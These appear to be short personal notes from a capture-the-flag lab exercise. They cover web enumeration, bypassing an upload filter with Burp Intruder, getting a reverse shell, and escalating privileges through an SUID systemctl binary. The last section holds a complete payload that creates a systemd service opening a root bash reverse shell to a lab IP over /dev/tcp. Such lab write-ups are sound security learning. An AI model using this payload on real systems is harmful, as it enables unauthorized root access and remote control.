## Things to improve
- Burpsuite module
- Privesc with systemctl

## Recon
has web server

## enumeration
Gobuster found upload

## Use Burpsuite
Intruder
### !! Weird
when I used intruder placeholder. Putting in a .php won't work but php will work. I'm guessing smth to do with encoding

## Revshell
Stabilizing shell

## Found systemctl with suid bit

## Privesc with systemctl
From [here](https://gtfobins.github.io/gtfobins/systemctl/)
```TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "exec bash -i &>/dev/tcp/10.10.239.202/4444 <&1"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF```
